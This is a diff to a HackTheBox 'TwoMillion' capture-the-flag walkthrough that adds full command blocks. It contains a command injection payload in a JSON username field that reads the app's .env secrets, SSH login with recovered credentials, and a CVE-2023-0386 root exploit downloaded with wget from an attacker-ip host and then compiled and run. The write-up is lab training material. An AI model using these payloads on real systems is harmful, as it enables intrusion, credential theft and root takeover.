@@ -110,17 +110,88 @@ Root/admin access came from the machine's core misconfiguration or vulnerability
 
 ## 🧰 Command Palette
 
-<details>
-<summary><b>Useful commands and technique anchors</b></summary>
+<details open>
+<summary><b>🔎 Recon</b></summary>
 
-- `ffuf/ferox + browser/API review of http://2million.htb`
-- `curl -X POST /api/v1/invite/generate`
-- `curl authenticated API endpoints to discover admin functions`
-- `Inject shell metacharacters into vulnerable admin VPN generation parameter`
-- `ssh admin@<target>`
-- `compile CVE-2023-0386 helper and trigger OverlayFS/FUSE privesc`
+```bash
+sudo nmap -sC -sV -Pn -p- -oN nmap_full.txt 10.129.229.66
+sudo nmap -sC -sV -Pn -p 22,80 -oN nmap_tcp.txt 10.129.229.66
+curl -i http://10.129.229.66/
+echo '10.129.229.66 2million.htb' | sudo tee -a /etc/hosts
+```
 
 </details>
+
+<details open>
+<summary><b>🎟️ Invite/API Enumeration</b></summary>
+
+```bash
+curl -s http://2million.htb/ | head
+curl -s http://2million.htb/js/inviteapi.min.js
+curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate
+curl -s -X POST http://2million.htb/api/v1/invite/generate | jq
+```
+
+</details>
+
+<details open>
+<summary><b>🧪 Authenticated API Testing</b></summary>
+
+```bash
+# After registering/logging in, reuse your session cookie
+COOKIE='PHPSESSID=<redacted>'
+
+curl -s -H "Cookie: $COOKIE" http://2million.htb/api/v1 | jq
+curl -s -H "Cookie: $COOKIE" http://2million.htb/api/v1/user/vpn/generate | jq
+curl -s -H "Cookie: $COOKIE" http://2million.htb/api/v1/admin/settings/update | jq
+curl -s -H "Cookie: $COOKIE" http://2million.htb/api/v1/admin/vpn/generate | jq
+```
+
+</details>
+
+<details open>
+<summary><b>💥 Command Injection / Foothold</b></summary>
+
+```bash
+# Shape of the vulnerable admin VPN-generation request
+curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
+  -H "Cookie: $COOKIE" \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"test; id;"}'
+
+# Use the primitive to read app/env material
+curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
+  -H "Cookie: $COOKIE" \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"test; cat /var/www/html/.env;"}'
+
+# SSH with recovered user credential
+ssh admin@10.129.229.66
+```
+
+</details>
+
+<details open>
+<summary><b>👑 Privilege Escalation — CVE-2023-0386</b></summary>
+
+```bash
+uname -a
+id
+
+# Transfer/compile the CVE-2023-0386 OverlayFS/FUSE exploit
+python3 -m http.server 8000
+wget http://<attacker-ip>:8000/cve-2023-0386.tar.gz -O /tmp/cve.tar.gz
+cd /tmp && tar xzf cve.tar.gz && cd CVE-2023-0386
+make
+
+# Run exploit workflow, then use the SUID/root primitive
+./fuse ./ovlcap/lower ./gc
+./exp
+./rootshell -p -c 'id; cat /root/root.txt'
+```
+
+</details>
+
 
 ---
 
